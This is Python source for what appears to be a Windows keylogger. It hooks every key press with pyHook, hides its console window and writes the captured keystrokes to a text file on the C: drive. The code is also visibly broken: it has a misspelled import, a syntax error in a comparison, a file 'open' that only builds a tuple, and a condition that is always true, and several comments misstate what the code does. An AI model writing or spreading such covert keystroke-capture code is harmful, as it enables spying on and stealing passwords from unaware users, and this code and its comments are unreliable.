# importing libraries

import win32api
import win32console
import qin32gui
import pythoncom,pyHook #<--pyHook is the class library for the keyboard.

# Show the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):

	if event.Ascii == 5:
		_exit(1)


	if event.Ascii >= 0 or 8:

		f = open('c:\output.txt', 'r+') #<-- open the text file as input for the keyboard

		buffer = f.read()

		f.close() #<--- Close the file on the OS when the user stops typing

	# Reopen the text file when the user starts typing again on the keyboard.
		f = ('c:\output.txt', 'w')

		keylogs = chr(event.Ascii)


		if event.Ascii = 13:

			keylogs = '/n'

			buffer += keylogs

			f.write(buffer)
			f.close()


# Create a hook for the manager object

hm = pyHook.HookManager() #<--- referencing classlibrary that was implemented
hm.KeyDown = OnKeyboardEvent #<--- everytime you press on the keyboard, run the function of logging events in the text file

# Set the hook
hm.HookKeyboard()

# wait forever
pythoncom.PumpMessages()




